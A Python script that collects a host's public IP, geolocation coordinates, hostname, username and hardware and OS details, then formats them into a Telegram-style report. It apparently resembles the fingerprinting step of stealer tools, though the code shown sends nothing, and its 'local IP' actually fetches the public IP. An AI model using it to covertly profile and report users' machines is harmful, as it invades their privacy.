
import os

import requests
import platform
import psutil
import cpuinfo
import GPUtil


IP_API_URL = "https://ipinfo.io"

def get_system_info():
    
    try:
        ip_data = requests.get(f"{IP_API_URL}/json").json()
        public_ip = ip_data.get("ip", "Unavailable")
        city = ip_data.get("city", "Unknown")
        region = ip_data.get("region", "Unknown")
        country = ip_data.get("country", "Unknown")
        location = ip_data.get("loc", "0,0")  # Latitude, Longitude
        country_emoji = get_country_flag_emoji(country)
    except Exception as e:
        public_ip = "Unavailable"
        city = region = country = location = country_emoji = "N/A"

    # Local hostname and IP
    hostname = platform.node()  
    local_ip = requests.get('https://api.ipify.org').text  

    # CPU information
    cpu_info = cpuinfo.get_cpu_info()
    cpu_name = cpu_info.get('brand_raw', 'Unknown CPU')
    cpu_architecture = platform.machine()

    # GPU information
    try:
        gpus = GPUtil.getGPUs()
        gpu_name = ', '.join([gpu.name for gpu in gpus]) if gpus else "No GPU found"
    except Exception as e:
        gpu_name = f"Error retrieving GPU info: {e}"

    # RAM size
    ram = str(round(psutil.virtual_memory().total / (1024**3), 2))  # Convert to string

    # OS details
    os_info = f"{platform.system()} {platform.release()}"

    
    
    return {
        "Public IP": public_ip,
        "City": city,
        "Region": region,
        "Country": country,
        "Country Flag": country_emoji,
        "Location": location,
        "Local IP": local_ip,
        "Hostname": hostname,
        "CPU Name": cpu_name,
        "CPU Architecture": cpu_architecture,
        "GPU Name": gpu_name,
        "RAM Size (GB)": ram,
        "Operating System": os_info,
    }

def get_country_flag_emoji(country_code):
    
    return ''.join([chr(127397 + ord(char)) for char in country_code.upper()])


def send_telegram_message(system_info, username):
    
    message = f"""
System Information 📊

**Username:** {username} 👤
**Public IP:** {system_info.get('Public IP', 'Unavailable')} 🌐
**Location:** {system_info.get('City', 'Unknown')}, {system_info.get('Region', 'Unknown')}, {system_info.get('Country', 'Unknown')} {system_info.get('Country Flag', '')} 🌍
**Coordinates:** {system_info.get('Location', '0,0')} 📍
**Hostname:** {system_info.get('Hostname', 'Unavailable')} 🖥️
**Local IP:** {system_info.get('Local IP', 'Unavailable')} 🌐
**CPU:** {system_info.get('CPU Name', 'Unknown CPU')} 🧠
**GPU:** {system_info.get('GPU Name', 'No GPU found')} 🎮
**RAM Size (GB):** {system_info.get('RAM Size (GB)', 'N/A')} 💾
**Operating System:** {system_info.get('Operating System', 'Unknown')} 🖥️
    """

    return message
    


def get_systeminfo():
    # Example usage:
    username = os.getlogin()
    system_info = get_system_info()
    return send_telegram_message(system_info, username)